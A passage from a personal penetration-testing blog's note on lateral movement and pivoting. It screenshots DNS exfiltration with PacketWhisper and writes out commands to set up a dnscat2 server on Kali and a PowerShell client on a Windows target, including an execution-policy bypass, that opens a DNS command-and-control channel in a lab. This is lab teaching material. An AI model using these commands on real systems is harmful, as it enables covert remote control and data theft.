<img alt=lm_40 loading=lazy src=/images/Pentesting/NP/PE/03/lm_40.png>
<img alt=lm_41 loading=lazy src=/images/Pentesting/NP/PE/03/lm_41.png>
<img alt=lm_42 loading=lazy src=/images/Pentesting/NP/PE/03/lm_42.png>
6. Now onto my listener on kali:
<img alt=lm_43 loading=lazy src=/images/Pentesting/NP/PE/03/lm_43.png>
7. Copy the captured traffic file to the <code>packetwhisper</code> directory , wherever you have downloaded it:
<img alt=lm_44 loading=lazy src=/images/Pentesting/NP/PE/03/lm_44.png>
8. Then use the following screenshots for further assists, before that change your dir to the <code>packetwhisper</code> dir:
<img alt=lm_45 loading=lazy src=/images/Pentesting/NP/PE/03/lm_45.png>
<img alt=lm_46 loading=lazy src=/images/Pentesting/NP/PE/03/lm_46.png>
<img alt=lm_47 loading=lazy src=/images/Pentesting/NP/PE/03/lm_47.png>
<img alt=lm_48 loading=lazy src=/images/Pentesting/NP/PE/03/lm_48.png>
9. Now catout the file, in my case i have received gibberish data:
<img alt=lm_49 loading=lazy src=/images/Pentesting/NP/PE/03/lm_49.png></p><hr><h2 id=trying-to-use-dnscat2>Trying to use dnscat2:<a hidden class=anchor aria-hidden=true href=#trying-to-use-dnscat2>#</a></h2><h3 id=installing-dependencies-for-dnscat2>Installing dependencies for dnscat2:<a hidden class=anchor aria-hidden=true href=#installing-dependencies-for-dnscat2>#</a></h3><ol><li>Open a terminal on kali and follow these commands:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install git ruby-dev build-essential
</span></span><span class=line><span class=cl>sudo gem install bundler
</span></span><span class=line><span class=cl>git clone https://github.com/iagox86/dnscat2.git
</span></span><span class=line><span class=cl><span class=nb>cd</span> dnscat2/server/
</span></span><span class=line><span class=cl>sudo bundle install
</span></span></code></pre></div><ol start=2><li>Install the windows version of <code>dnscat2</code> by cloning this given git repo: <a href=https://github.com/lukebaggett/dnscat2-powershell>dnscat2-powershell</a></li><li>Then start the python http server and transfer the <code>dnscat2 powershell</code> script.</li></ol><hr><h4 id=exection>Exection:<a hidden class=anchor aria-hidden=true href=#exection>#</a></h4><ol><li>On kali setup the client:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> dnscat2/server
</span></span><span class=line><span class=cl>sudo ruby ./dnscat2.rb mylab.local --no-cache 
</span></span></code></pre></div><ol start=2><li>Then copy this secret
<img alt=lm_50 loading=lazy src=/images/Pentesting/NP/PE/03/lm_50.png></li><li>Come to the windows machine and run these commands:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Bypass the script blocker for this one time</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ExecutionPolicy</span> <span class=n>-ExecutionPolicy</span> <span class=n>Bypass</span> <span class=n>-Scope</span> <span class=k>Process</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Run the client</span>
</span></span><span class=line><span class=cl><span class=p>.\</span><span class=n>dnscat2</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-Domain</span> <span class=n>mylab</span><span class=p>.</span><span class=py>local</span> <span class=n>-Secret</span> <span class=p>[</span><span class=nb>the-new</span><span class=n>-secret-key-from-your-server</span><span class=p>]</span>
</span></span></code></pre></div><p><img alt=lm_51 loading=lazy src=/images/Pentesting/NP/PE/03/lm_51.png>
You can face some problems just like i faced, try to open the firewall port on kali machine for incoming connections on port <code>53</code> using the command <code>sudo ufw allow 53/udp</code> , then check the status using the command <code>sudo ufw status verbose</code>
<img alt=lm_52 loading=lazy src=/images/Pentesting/NP/PE/03/lm_52.png></p><ul><li>To troubleshoot further issues you can check whether the packets are coming on port 53 or not using the following technique:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># on kali run this command:</span>
</span></span><span class=line><span class=cl>sudo tcpdump -i eth0 -n udp port <span class=m>53</span> and src host 192.168.83.140<span class=o>{</span>the target machine<span class=err>&#39;</span>s ip<span class=o>}</span>  
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># on target machine </span>
</span></span><span class=line><span class=cl><span class=n>nslookup</span> <span class=n>test</span><span class=p>.</span><span class=py>mylab</span><span class=p>.</span><span class=py>local</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>83</span><span class=p>.</span><span class=py>128</span><span class=p>{</span><span class=n>kali</span> <span class=n>ip</span><span class=p>}</span>
</span></span></code></pre></div><p><img alt=lm_53 loading=lazy src=/images/Pentesting/NP/PE/03/lm_53.png>
if error occurs from the target&rsquo;s side:
<img alt=lm_54 loading=lazy src=/images/Pentesting/NP/PE/03/lm_54.png></p><ul><li>remember to test this technique while your dnscat is running on kali.
<em>I WILL LATER ON ADD MORE STUFF ON THESE DNS RELATED ATTACKS.</em></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://0x-s0M3n4th.github.io/tags/lateral-movement/>Lateral Movement</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/pivoting/>Pivoting</a></li><li><a href=https://0x-s0M3n4th.github.io/tags/internal-network/>Internal Network</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on x" href="https://x.com/intent/tweet/?text=Lateral%20Movement%20and%20Pivoting&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f&amp;hashtags=LateralMovement%2cPivoting%2cInternalNetwork"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f&amp;title=Lateral%20Movement%20and%20Pivoting&amp;summary=Lateral%20Movement%20and%20Pivoting&amp;source=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on reddit" href="https://reddit.com/submit?url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f&title=Lateral%20Movement%20and%20Pivoting"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on whatsapp" href="https://api.whatsapp.com/send?text=Lateral%20Movement%20and%20Pivoting%20-%20https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on telegram" href="https://telegram.me/share/url?text=Lateral%20Movement%20and%20Pivoting&amp;url=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Lateral Movement and Pivoting on ycombinator" href="https://news.ycombinator.com/submitlink?t=Lateral%20Movement%20and%20Pivoting&u=https%3a%2f%2f0x-s0M3n4th.github.io%2fnotes%2fpen-testing-notes%2fnetwork-pentesting%2f08-post-exploitation-techniques%2f03-lateral-movement-and-pivoting%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer><script src=https://giscus.app/client.js data-repo=0x-s0M3n4th/0x-s0M3n4th.github.io data-repo-id=R_kgDOPV2wYg data-category=General data-category-id=DIC_kwDOPV2wYs4C1aSa data-mapping=url data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous async></script></article></main><footer class=footer><span>&copy; 2026 <a href=https://0x-s0M3n4th.github.io/>0x-s0M3n4th's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>